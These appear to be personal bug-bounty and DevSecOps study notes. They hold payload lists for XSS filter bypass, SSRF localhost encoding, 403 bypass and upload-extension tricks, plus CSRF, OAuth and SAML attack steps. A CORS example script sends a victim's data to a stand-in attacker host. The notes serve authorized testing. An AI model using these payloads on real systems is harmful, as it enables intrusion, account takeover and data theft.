height="3.5416666666666665in"}

**All Steps have to be automatic.**

## Version Control System :

**This phase deals with the writing and management of the source code.
When multiple developers are working on a big project, the code from all
contributors needs to be collected in one place (Code Repository) before
the build phase.**

## Testing :

**Testing is done by the developers to make sure that the software/app
is working fine. In this phase, we are focusing on the automated tests
written by the developers that can be run automatically after each
build.**

**Exemples de framework de test automatique : JUnit, Pytest, Tox,
Selenium ( pour interagir avec les navigateurs )**

## Intégration Continue :

**L'intégration continue est un ensemble de pratiques consistant à
tester de manière automatisée chaque révision de code avant de le
déployer en production.**

**Lorsque le développeur code une fonctionnalité, il conçoit également
le test associé et ajoute le tout à son dépôt de code. Le serveur
d'intégration va ensuite faire tourner tous les tests pour vérifier
qu'aucune régression n'a été introduite dans le code source suite à cet
ajout. Si un problème est identifié, le déploiement n'a pas lieu et les
Dev sont notifiés. Si aucune erreur n'est remontée, le serveur
d'intégration peut déployer directement le code en production.**

**Ainsi, avec l'intégration continue la phase de tests automatisés est
complètement intégrée au flux de déploiement.**

![](media/image194.png){width="4.416748687664042in"
height="2.247117235345582in"}

**Exemple de tools : Jenkins, Gitlab CI, Travis CI, TeamCity, GoCD**

**In the case of DevSecops, the CI server triggers the security tools in
different phases (e.g. Static Code Analysis, Dynamic Analysis, etc) and
stores the logs/reports.**

## Infrastructure as Code

**Infrastructure as Code (IaC) dictates that the infrastructure needed
to deploy (or test deploy) the application (e.g. application server,
dependencies, WAF, database server, etc.), should be defined in a
file/script that can be executed to make the infrastructure ready. It
covers the tools/techniques used to automate the creation of setup for
deployment (or test deployment) of the project.**

**Exemple de tool : Ansible**

**Why is "Infrastructure as Code" important in DevSecOps?**

**Infrastructure as Code saves the repetitive human effort in setting up
and managing the infrastructure. It also removes the human error
altogether (i.e. once the script is finalized) by making sure that
everything is set up, in the same way, every time the script is run. It
also ensures that the developers and testers are working on an accurate
setup with no special settings/misconfiguration etc caused by the
operations team.**

# Audit en boîte blanche

## Code Review : Strategies :

-   **1) Read Everything ( function by function ) directly :**

    -   **Very time consuming (Almost impossible if the code is too
        > large)**

    -   **Very good way when you are apart of an internal team and you
        > aren't just looking for vulnerabilities but also for
        > weaknesses that can be fixed to increase the security.**

    -   **But the coverage of the review the code is perfect**

![](media/image240.png){width="5.889763779527559in" height="3.125in"}

-   **2) Function to called function ( TOP to the BOTTOM ) :**

    -   **By picking up a function (ideally directly accessible form an
        > user) and reviewing every function that is called and doing
        > the same process for the called functions.**

![](media/image432.png){width="2.614665354330709in"
height="3.1931310148731407in"}

-   **Only Searching for expressions or dangerous functions isn't a good
    > way to make a code review because :**

    -   **Maybe the function in question is never accessed by any user
        > input.**

```{=html}
<!-- -->
```
-   **3) Functionally by Functionally :**

    -   **Picking a functionality and reviewing the code that is linked
        > with.**

![](media/image108.png){width="3.626528871391076in"
height="4.442708880139983in"}

## Code Review : Reviewing :

-   ### Méthode 1

    -   Function context :

![](media/image239.png){width="5.889763779527559in"
height="2.9583333333333335in"}

# Bug bounty Tips

-   ## BB - Recon (file, url, subdomains):

-   **For wordlist** : https://wordlists.assetnote.io/

+-----------------------------------------------------------------------+
| -   **Using grep to extract URLs in HTTP response : curl -i \[URL\]   |
|     > \| grep -Eo \"(http\|https)://\[a-zA-Z0-9./?=\_-\]\***"         |
+=======================================================================+
| -   **cd /home/kali/prog/lib/GRecon/ ; python3 grecon.py :**          |
|                                                                       |
|     -   **GRecon_Cli tool using Google Dork to find :**               |
|                                                                       |
|         -   **Sub-Subdomains**                                        |
|                                                                       |
|         -   **Signup/Login pages**                                    |
|                                                                       |
|         -   **Dir Listing**                                           |
|                                                                       |
|         -   **Exposed Docs ( pdf, xls, docx ... )**                   |
|                                                                       |
|         -   **WordPress Entries**                                     |
|                                                                       |
|         -   **Pasting Sites ( Records in pastebin, Ghostbin... )**    |
+-----------------------------------------------------------------------+
| -   **Grawler - v1.0 : Grawler is the best tool ever, made for        |
|     > automating google dorks (https://github.com/A3h1nt/Grawler)**   |
|                                                                       |
| > **This is a website tool.**                                         |
| >                                                                     |
| > **Run with php -S localhost:8000 in the website folder ( tool       |
| > folder ).**                                                         |
|                                                                       |
| -   Fast Google Dorks Scan :                                          |
+-----------------------------------------------------------------------+
| -   **JavaScript recon automation :**                                 |
|                                                                       |
|     -   **Gather JSFile links from the target**                       |
|                                                                       |
|     -   **Finding Endpoints From the JSFiles**                        |
|                                                                       |
|     -   **Finding Secrets in the JSFiles**                            |
|                                                                       |
|     -   **Get JSFiles locally for manual analysis**                   |
|                                                                       |
|     -   **tools :**                                                   |
|                                                                       |
|         -   **JSParser : parse relative URLs from JavaScript files**  |
+-----------------------------------------------------------------------+
| -   **Github**                                                        |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

-   ## BB - CSRF Bypass protection :

+-----------------------------------------------------------------------+
| -   **Using a CSRF token across accounts**                            |
+=======================================================================+
| -   **Replacing value of same length :** for instance it is an        |
|     > alphanumeric token of 32 characters under the variable          |
|     > authenticity_token you replace the same variable some other 32  |
|     > character value                                                 |
+-----------------------------------------------------------------------+
| -   **Removing the CSRF token from requests entirely ( or just the    |
|     > value of the parameter )**                                      |
+-----------------------------------------------------------------------+
| -   **Decoding CSRF tokens then identifying how it's made and trying  |
|     > to modify it.**                                                 |
|                                                                       |
| > Most of the time, CSRF tokens are either MD5 or Base64 encoded      |
| > values.                                                             |
+-----------------------------------------------------------------------+
| -   **Extracting token via HTML injection ( Dangling \... )**         |
+-----------------------------------------------------------------------+
| -   **Using only the static parts of the token if it's made with a    |
|     > static part.**                                                  |
+-----------------------------------------------------------------------+
| -   **Clickjacking**                                                  |
+-----------------------------------------------------------------------+
| -   **Change the request method**                                     |
+-----------------------------------------------------------------------+
| -   If the double-submit token cookie is used as the defense          |
|     > mechanism :                                                     |
|                                                                       |
|     -   **session fixation technique =\> Then, execute the CSRF with  |
|         > the same CSRF token that you fix as the cookie.**           |
+-----------------------------------------------------------------------+
| -   For CSRF Protection via Referer :                                 |
|                                                                       |
|     -   **You can add the following meta tag to the page hosting your |
|         > payload to Remove the referer header.**                     |
|                                                                       |
|     -   **You can try bypassing the verification of the header by     |
|         > including authorized terms in the URL CSRF payload.**       |
|                                                                       |
|     -   **Utiliser la fonction history.pushState() dans le payloads   |
|         > pour modifier l'en-tête Referer.**                          |
+-----------------------------------------------------------------------+
| -   **Check if there is a CSRF token**                                |
+-----------------------------------------------------------------------+
| -   **CSRF JSON Data :**                                              |
|                                                                       |
|     -   **Check if we change the Content-type to text/plain there is  |
|         > no error. Then, construct the CSRF.**                       |
|                                                                       |
|     -   **Check if we change the Content-type to                      |
|         > application/x-www-form-urlencoded there is no error. Then,  |
|         > construct the CSRF.**                                       |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   **Check if we change the Content-type to multipart/form-data      |
|     > there is no error. Then, construct the CSRF.**                  |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   **Rajouter à la fin de l'url .json**                              |
|                                                                       |
| **https                                                               |
| ://medium.com/@osamaavvan/json-csrf-to-formdata-attack-eb65272376a2** |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

-   ## BB - OAuth :

+-----------------------------------------------------------------------+
| -   **Test CSRF for Linking external Account**                        |
+=======================================================================+
| -   **Test CSRF into Open redirect for retrieving the victim's token  |
|     > ( or code )**                                                   |
+-----------------------------------------------------------------------+
| -   **1) CSRF-Login in the Authorisation Server**                     |
|                                                                       |
| -   **2) CSRF-Linking with the victim account and your AS account (   |
|     > Authorization Server )**                                        |
|                                                                       |
| > **3) Log in with your AS Account to take over the victim's          |
| > account.**                                                          |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

-   ## BB - SAML :

+-----------------------------------------------------------------------+
| -   **Comment injection in XML document in the mail address for       |
|     > login**                                                         |
+=======================================================================+
| -   **Signature Stripping**                                           |
+-----------------------------------------------------------------------+
| -   **Change the login of a user ( in the SAMLResponse )**            |
+-----------------------------------------------------------------------+
| -   **Try to use the default secret key provided by the library       |
|     > used.**                                                         |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

-   ## BB - Bypassing 403 and 401 error :

-   

+-----------------------------------------------------------------------+
| -   **Use byp4xx script to automate the attack**                      |
+=======================================================================+
| -   **Changing HTTP verbs**                                           |
+-----------------------------------------------------------------------+
| -   **Plugin on Burp suite : 403Bypasser =\> automates bypassing of   |
|     > 403 Forbidden errors.**                                         |
+-----------------------------------------------------------------------+
| -   **target.com/admin..;/**                                          |
|                                                                       |
| -   **target.com/../admin**                                           |
|                                                                       |
| -   **target.com/whatever/..;/admin**                                 |
|                                                                       |
| -   **target.com/admin/**                                             |
|                                                                       |
| -   **target.com/admin/.**                                            |
|                                                                       |
| -   **target.com//admin//**                                           |
|                                                                       |
| -   **target.com/./admin/..**                                         |
|                                                                       |
| -   **target.com//admin/\***                                          |
|                                                                       |
| -   **http://site.com/secret =\> 200 OK ( http sans le S )**          |
|                                                                       |
| -   **site.com/%2f/secret.txt/**                                      |
|                                                                       |
| -   **target.com/admin%20/**                                          |
|                                                                       |
| -   **target.com/%20admin%20/**                                       |
|                                                                       |
| -   **target.com/admin%20/page**                                      |
|                                                                       |
| -   **/.;/admin**                                                     |
|                                                                       |
| -   **/admin;/**                                                      |
|                                                                       |
| -   **/admin/\~**                                                     |
|                                                                       |
| -   **/admin?param**                                                  |
|                                                                       |
| -   **/%2e/admin**                                                    |
|                                                                       |
| -   **/admin#**                                                       |
|                                                                       |
| -   **by deeper traversing :**                                        |
|                                                                       |
|     -   **/.git =\> 403**                                             |
|                                                                       |
|     -   **/.git/config =\> 200 OK**                                   |
|                                                                       |
| -   **Headers to Rewrite URLs :**                                     |
|                                                                       |
|     -   **X-Original-URL: /admin OR localhost**                       |
|                                                                       |
|     -   **X-Override-URL: /admin**                                    |
|                                                                       |
|     -   **X-Rewrite-URL: /admin**                                     |
|                                                                       |
|     -   **X-Originating-IP: /admin**                                  |
|                                                                       |
|     -   **X-Remote-IP: /admin**                                       |
|                                                                       |
|     -   **X-Client-IP: /admin**                                       |
|                                                                       |
|     -   **X-Forwarded-For: /admin**                                   |
|                                                                       |
|     -   **\...**                                                      |
+-----------------------------------------------------------------------+
| -   **Try inserting unicode characters to bypass the defenses**       |
|                                                                       |
|     -   **Example : ℀ = ca, ℁ = sa**                                  |
|                                                                       |
| > **So if /cadmin is blocked, try accessing ℀dmin.**                  |
|                                                                       |
| **You can find example on this site :                                 |
| [[https://gi                                                          |
| thub.com/filedescriptor/Unicode-Mapping-on-Domain-names]{.underline}] |
| (https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names)** |
+-----------------------------------------------------------------------+
| -   **Referrer: target.com/admin**                                    |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

-   ## BB : File upload :

+-----------------------------------------------------------------------+
| -   Alternative to classic extensions :                               |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps,       |
|     > .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar,    |
|     > .inc                                                            |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm,     |
|     > .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml       |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action           |
|                                                                       |
| -   Coldfusion: .cfm, .cfml, .cfc, .dbm                               |
|                                                                       |
| -   Flash: .swf                                                       |
|                                                                       |
| -   Perl: .pl, .cgi                                                   |
|                                                                       |
| -   Erlang Yaws Web Server: .yaws                                     |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   using some uppercase letters: pHp, .pHP5, .PhAr \...              |
+=======================================================================+
| -   Bypass file extensions checks                                     |
|                                                                       |
|     -   1\) Adding a valid extension before the execution extension   |
|                                                                       |
|         -   file.png.php                                              |
|                                                                       |
|         -   file.png.Php5                                             |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   2\) Try adding special characters at the end ( with a wordlist;   |
|     > bruteforce with Burp ).                                         |
|                                                                       |
|     -   file.php%20                                                   |
|                                                                       |
|     -   file.php%0a                                                   |
|                                                                       |
|     -   file.php%00                                                   |
|                                                                       |
|     -   file.php%0d%0a                                                |
|                                                                       |
|     -   file.php/                                                     |
|                                                                       |
|     -   file.php.\\                                                   |
|                                                                       |
|     -   file.                                                         |
|                                                                       |
|     -   file.php\....                                                 |
|                                                                       |
|     -   file.pHp5\....                                                |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   file.php%00.png                                                   |
|                                                                       |
| -   file.php\\x00.png                                                 |
|                                                                       |
| -   file.php%0a.png                                                   |
|                                                                       |
| -   file.php%0d%0a.png                                                |
|                                                                       |
| -   file.phpJunk123png                                                |
|                                                                       |
| -   file.png.jpg.php                                                  |
|                                                                       |
| -   file.php%00.png%00.jpg                                            |
|                                                                       |
| ```{=html}                                                            |
| <!-- -->                                                              |
| ```                                                                   |
| -   3\) Try to put the exec extension before the valid extension and  |
|     > pray so the server is misconfigured :                           |
|                                                                       |
|     -   ex: file.php.png                                              |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -   Turning LFI to RCE in PHP using ZIP wrapper                       |
|                                                                       |
| Condition :                                                           |
|                                                                       |
| -   For PHP based websites.                                           |
|                                                                       |
| -   We can upload zip files.                                          |
|                                                                       |
| -   LFI (Local File Inclusion) vulnerability present in the server    |
|                                                                       |
| ![](media/image251.png){width="5.135416666666667in" height="1.5in"}   |
|                                                                       |
| Using this trick ( zip ) we have basically circumvented the file      |
| upload restrictions of the web application disallowing us to upload a |
| php file directly.                                                    |
+-----------------------------------------------------------------------+

## 

## 

-   ## BB : Broken access control :

+-----------------------------------------------------------------------+
| -                                                                     |
+=======================================================================+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

-   ## BB - XSS :

-   

+-----------------------------------------------------------------------+
| -   **Payload in XML file :**                                         |
|                                                                       |
| > ![](media/image260.png){width="4.052083333333333in"                 |
| > height="1.1354166666666667in"}                                      |
+=======================================================================+
| -   **XSS recon :**                                                   |
|                                                                       |
|     -   **xss_check \[URL\] ( without "https://" )**                  |
+-----------------------------------------------------------------------+
| -   **Polyglot payload ( depending on the situation,adapt it and do   |
|     > not copy & paste blindly ) :**                                  |
|                                                                       |
|     -   **\--\>\'\"/\>\</sCript\>\<deTailS open x=\"\>\"              |
|         > ontoggle=(co\\u006efirm)\`\`\>**                            |
|                                                                       |
|     -   **jaVasCript:/\*-/\*\`/\*\\\`/\*\'/\*\"/\*\*/(/\*             |
|         > \*/oNcliCk=alert()                                          |
|         > )//%0D%0A%0d%0a//\</stYle/\</titLe                          |
| /\</teXtarEa/\</scRipt/\--!\>\\x3csVg/\<sVg/oNloAd=alert()//\>\\x3e** |
|                                                                       |
|     -                                                                 |
| **jaVasCript:/\*\--\>\</title\>\</style\>\</textarea\>\</script\>\</x |
| mp\>\<svg/onload=\'+/\"/+/onmouseover=1/+/\[\*/\[\]/+alert(1)//\'\>** |
+-----------------------------------------------------------------------+
| -   **DOM-XSS scanner online :**                                      |
|                                                                       |
|     -   **https://domxssscanner.geeksta.net/scan?**                   |
+-----------------------------------------------------------------------+
| -   **XSS firewall bypass techniques**                                |
|                                                                       |
|     -   **lower/uppercase : \<sCRipT\>alert(1)\</sCRiPt\>**           |
|                                                                       |
|     -   **CRLF injection : \<script\>%0d%0aalert(1)\</script\>**      |
|                                                                       |
|     -   **Double encoding : %2522**                                   |
|                                                                       |
|     -   **Testing for recursive filters :                             |
|         > \<scr\<script\>ipt\>alert(1);\</scr\</script\>ipt\>**       |
|                                                                       |
|     -   **Injecting anchor tag without whitespaces :                  |
|         > \<                                                          |
| a/href=\"j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;\"\>** |
|                                                                       |
|     -   **Try to bypass whitespaces using a bullet :                  |
|         > \<svg•onload=alert(1)\>**                                   |
|                                                                       |
|     -   **Try to change request method**                              |
|                                                                       |
|     -   **Add any number of \\n, \\t or \\r : java\\nscript**         |
|                                                                       |
|     -   **Add characters from \\x00-\\x20 at the beginning :          |
|         > \\x01javascript**                                           |
|                                                                       |
|     -   **Variation of alert() : write(1) , confirm(1), prompt(1)**   |
|                                                                       |
|     -   **payload without parenthesis :**                             |
|                                                                       |
| > **\<script\>onerror=alert;throw 1\</script\>**                      |
|                                                                       |
| -   **window\[/loc.source%2B/ation/.source\] ( Regex for bypass words |
|     > filtered )**                                                    |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

-   ## BB - SSRF :

-   

+-----------------------------------------------------------------------+
| -   **payload for finding internal service :**                        |
|                                                                       |
|     -   [**[http://127.1/]{.underline}**](about:blank)                |
|                                                                       |
|     -   [**[http://0000::1:80/]{.underline}**](about:blank)           |
|                                                                       |
|     -   [**[http://\[::\]:80/]{.underline}**](http://%5B::%5D:80/)    |
|                                                                       |
|     -   [**[http://2130706433/]{.underline}**](about:blank)           |
|                                                                       |
|     -   [**[http:                                                     |
| //whitelisted@127.0.0.1]{.underline}**](http://whitelisted@127.0.0.1) |
|                                                                       |
|     -   [**[http://0x7f000001/]{.underline}**](about:blank)           |
|                                                                       |
|     -   [**[http://017700000001]{.underline}**](about:blank)          |
|                                                                       |
|     -   [**[http://0177.00.00.01]{.underline}**](about:blank)         |
|                                                                       |
|     -   **http://0xd8.0x3a.0xd6.0xe3**                                |
|                                                                       |
|     -   **http://0xd83ad6e3**                                         |
|                                                                       |
|     -   **http://0xd8.0x3ad6e3**                                      |
|                                                                       |
|     -   **http://0xd8.0x3a.0xd6e3**                                   |
|                                                                       |
|     -   **http://0330.072.0326.0343**                                 |
|                                                                       |
|     -   **http://000330.0000072.0000326.00000343**                    |
|                                                                       |
|     -   **http://033016553343**                                       |
|                                                                       |
|     -   **http://3627734755**                                         |
|                                                                       |
|     -   **http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37**         |
|                                                                       |
|     -   **http://216.0x3a.00000000326.0xe3**                          |
|                                                                       |
|     -                                                                 |
+=======================================================================+
| -   **You can also use Weird Unicode characters for bypassing**       |
+-----------------------------------------------------------------------+
| -   **You can also utilize the nio.io service, which is a simple      |
|     > wildcard DNS service for any IP address :**                     |
|                                                                       |
|     -   **10.0.0.1.nip.io maps to 10.0.0.1**                          |
|                                                                       |
|     -   **app.10.8.0.1.nip.io maps to 10.8.0.1**                      |
|                                                                       |
|     -   **customer1.app.10.0.0.1.nip.io maps to 10.0.0.1**            |
+-----------------------------------------------------------------------+
| -   **Use absolute URL on HTTPs syntax protocol**                     |
|                                                                       |
|     -   **GET \[ENTIRE_URL\] HTTP/1.1 instead of GET /\[FILE\]        |
|         > HTTP/1.1**                                                  |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

-   ## BB - Login/password form :

+-----------------------------------------------------------------------+
| -   **Check if there is a rate limiting login attempts ( against      |
|     > brute forcing )**                                               |
+=======================================================================+
| -   **Weak password policy ( see in password reset also )**           |
+-----------------------------------------------------------------------+
| -   **Username enumeration**                                          |
|                                                                       |
|     -   **Status codes**                                              |
|                                                                       |
|     -   **Error messages**                                            |
|                                                                       |
|     -   **Response times**                                            |
+-----------------------------------------------------------------------+
| -   **Application logins that are not protected by TLS encryption**   |
+-----------------------------------------------------------------------+
| -   **2FA :**                                                         |
|                                                                       |
|     -                                                                 |
+-----------------------------------------------------------------------+
| -   **SQL Injection**                                                 |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+
|                                                                       |
+-----------------------------------------------------------------------+

## 

-   ## BB - CORS :

+-----------------------------------------------------------------------+
| -   **Check there is the header Access-Control-Allow-Credentials to   |
|     > be set to true ( allow the victim's browser to send the         |
|     > credentials by the cookie )**                                   |
|                                                                       |
| > **If this is the case, you can then try an HTTP header injection.** |
+=======================================================================+
| -   **Check if the Origin Header is reflected in the header responses |
|     > of ACAO header.**                                               |
+-----------------------------------------------------------------------+
| -   ![](media/image354.png){width="4.54966426071741in"                |
|     > height="2.1354166666666665in"}                                  |
+-----------------------------------------------------------------------+
| -   **Send the header "Origin : null" and see if the vulnerable       |
|     > application whitelists the null origin. If the target accepts a |
|     > null origin, you can use tricks to generate this header in the  |
|     > victim with your payload.**                                     |
|                                                                       |
|     -   **example of trick:**                                         |
|                                                                       |
| **\<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" |
| src=\"data:text/html,\<script\>**                                     |
|                                                                       |
| **var req = new XMLHttpRequest();**                                   |
|                                                                       |
| **req.onload = reqListener;**                                         |
|                                                                       |
| **req.o                                                               |
| pen(\'get\',\'vulnerable-website.com/sensitive-victim-data\',true);** |
|                                                                       |
| **req.withCredentials = true;**                                       |
|                                                                       |
| **req.send();**                                                       |
|                                                                       |
| **function reqListener() {**                                          |
|                                                                       |
| **location=\'malicious-website.com/log?key=\'+this.responseText;**    |
|                                                                       |
| **};**                                                                |
|                                                                       |
| **\</script\>\"\>\</iframe\>**                                        |
+-----------------------------------------------------------------------+
| -   **Advance Regexp bypasses**                                       |
|                                                                       |
| **Most of the regex used to identify the domain inside the string     |
| will focus on alphanumeric ASCII characters and ".-". But some        |
| browser support other characters in a domain name ( see the image     |
| below ) :**                                                           |
|                                                                       |
| -                                                                     |
|                                                                       |
| ![](media/image394.png){width="5.552083333333333in"                   |
| height="4.972222222222222in"}                                         |
+-----------------------------------------------------------------------+
| -   **Attack from an XSS inside a whitelisted subdomain**             |
+-----------------------------------------------------------------------+
| -   **Try to add a callback parameter in the request. Maybe the page  |
|     > was prepared to send the data as JSONP. ( Content-Type:         |
|     > application/javascript )**                                      |
|                                                                       |
| ![](media/image267.png){width="5.552083333333333in"                   |
| height="0.2916666666666667in"}                                        |
+-----------------------------------------------------------------------+
| -   **[[https://github.com/                                           |
| chenjj/CORScanner]{.underline}](https://github.com/chenjj/CORScanner) |
|     > :**                                                             |
|                                                                       |
|     -   **cors_scan.py**                                              |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

-   ## BB - Web Cache Poisoning :

+-----------------------------------------------------------------------+
| -   **Pour Supprimer une page du cache :**                            |
|                                                                       |
|     -   **Ajouter le header "Cache-control Ou Pragma" avec comme      |
|         > valeur \"non-cache\" à la requête envoyée.**                |
|                                                                       |
| > **Exemple :**                                                       |
|                                                                       |
| -   ![](media/image37.png){width="2.6041666666666665in"               |
|     > height="0.5416666666666666in"}                                  |
+=======================================================================+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

-   ## BB - HTTP response header injection :

+-----------------------------------------------------------------------+
| -   **Tenter une attaque de type HTTP Response Splitting into XSS sur |
|     > la 2ème réponse.**                                              |
+=======================================================================+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+

## 

-   ## BB - HTTP Host header attacks :

+-----------------------------------------------------------------------+
| -   **Try to supply an arbitrary, unrecognized domain name via the    |
|     > Host header to see what happens.**                              |
|                                                                       |
| -                                                                     |
+=======================================================================+
| -   **Injection in port :**![](media/image204.png){width="4.625in"    |
|     > height="0.625in"}                                               |
+-----------------------------------------------------------------------+
| -   **Classic techniques to bypass whitelist site :**                 |
|                                                                       |
| > **Example :**                                                       |
|                                                                       |
| -   ![](media/image13.png){width="4.257996500437446in"                |
|     > height="0.5437696850393701in"}                                  |
+-----------------------------------------------------------------------+
| -   **Inject duplicate Host headers :**                               |
|                                                                       |
|     -   ![](media/image277.png){width="3.4791666666666665in"          |
|         > height="0.8958333333333334in"}                              |
|                                                                       |
|     -   ![](media/image382.png){width="3.6354166666666665in"          |
|         > height="0.8854166666666666in"}                              |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -                                                                     |
+-----------------------------------------------------------------------+
| -   **Use absolute URL on HTTPs syntax protocol**                     |
|                                                                       |
| > **Example :**                                                       |
|                                                                       |
| -   **GET \[ENTIRE_URL\] HTTP/1.1**                                   |
|                                                                       |
| > **HOST : \[ DOMAIN / IP / PAYLOAD \]**                              |
| >                                                                     |
| > **Instead of**                                                      |
|                                                                       |
| -   **GET /\[FILE\] HTTP/1.1**                                        |
|                                                                       |
| > **HOST : \[ DOMAIN / IP / PAYLOAD \]**                              |
+-----------------------------------------------------------------------+

## 

-   ## BB - API :

+-----------------------------------------------------------------------+
| -   **Search for API patterns inside the api and try to use it to     |
|     > discover more.**                                                |
|                                                                       |
| > **If you find /api/albums/\<album_id\>/photos/\<photo_id\> you      |
| > could try also things like /api/posts/\<post_id\>/comment/. Use     |
| > some fuzzer to discover this new endpoints.**                       |
+=======================================================================+
| -   **Something like the following example might get you access to    |
|     > another user's photo album:**                                   |
|                                                                       |
| > **/api/MyPictureList →                                              |
| > /api/MyPictureList?user_id=\<other_user_id\>**                      |
+-----------------------------------------------------------------------+
| ![](media/image333.png){width="5.885416666666667in"                   |
| height="0.8055555555555556in"}                                        |
+-----------------------------------------------------------------------+
| ![](media/image433.png){width="3.4053313648293964in"                  |
| height="1.828125546806649in"}                                         |
+-----------------------------------------------------------------------+
| -   **HTTP request method change (GET, POST, PUT, DELETE, PATCH,      |
|     > INVENTED)**                                                     |
+-----------------------------------------------------------------------+
| ![](media/image208.png){width="5.885416666666667in"                   |
| height="1.7638888888888888in"}                                        |
+-----------------------------------------------------------------------+
| -   ![](media/image386.png){width="4.679800962379702in"               |
|     > height="3.6614588801399823in"}                                  |
+-----------------------------------------------------------------------+
| ![](media/image338.png){width="5.885416666666667in" height="1.625in"} |
+-----------------------------------------------------------------------+
| -   **https://github.com/shieldfy/API-Security-Checklist**            |
+-----------------------------------------------------------------------+
| > **-**                                                               |
+-----------------------------------------------------------------------+
| > **-**                                                               |
+-----------------------------------------------------------------------+
| > **-**                                                               |
+-----------------------------------------------------------------------+
| > **-**                                                               |
+-----------------------------------------------------------------------+
| > **-**                                                               |
+-----------------------------------------------------------------------+
| > **-**                                                               |
+-----------------------------------------------------------------------+
| > **-**                                                               |
